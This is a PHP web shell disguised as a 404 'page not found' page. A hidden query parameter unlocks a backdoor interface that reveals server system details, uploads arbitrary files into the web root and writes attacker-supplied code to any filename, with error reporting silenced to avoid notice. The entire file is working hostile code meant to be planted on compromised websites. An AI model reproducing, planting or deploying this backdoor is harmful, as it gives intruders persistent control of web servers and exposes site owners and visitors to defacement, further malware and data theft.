<html><head><title>404</title></head><body><h1>oops ! page not found</h1><p>Back to home.</p></body></html>
<?php
set_time_limit(0);
error_reporting(0);
error_log(0);
if(isset($_GET["x"])){
echo "<center>
<h4>✘✘✘ 𝚂𝙽𝙸𝙿𝙴𝚁𝟺𝟶𝟺 𝙶𝙷𝙾𝚂𝚃 𝚇𝙿𝙻𝙾𝙸𝚃 ✘✘✘</h4><br><b>".php_uname()."</b><br><br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='FUCK'>
<input type='submit' name='TOD' value='UPLOAD'>
</form><br><br>";

$SNIPER404 = $_SERVER['DOCUMENT_ROOT'];
$GHOST = $_FILES['FUCK']['name'];
$ANJIR = $SNIPER404.'/'.$GHOST;
if(isset($_POST['TOD'])) {
if(is_writable($SNIPER404)) {
if(@copy($_FILES['FUCK']['tmp_name'], $ANJIR)) {
$XPLOIT = "http://".$_SERVER['HTTP_HOST']."/";
echo "Sukses mas :) <a href='$XPLOIT/$GHOST' target='_blank'>$XPLOIT/$GHOST</a>";
} else {
echo "Gagal mas :(";
}
} else {
if(@copy($_FILES['FUCK']['tmp_name'], $GHOST)) {
echo "Sukses di folder ini mas";
} else {
echo "";
}
}
}

if (!isset($_POST["submit"])) {
echo "<form method='POST'>
<center>BYPASS <input type='text' name='fname' size=''><br><br /> <textarea cols='30' rows='15' name='fcode'></textarea><br><br /><input type='submit' name='submit' value='BYPASS'> </form></center>";
  
} else { $fname = $_POST["fname"]; $fcode = $_POST["fcode"]; fwrite(fopen($fname, "w"), $fcode); 
}
}
?>
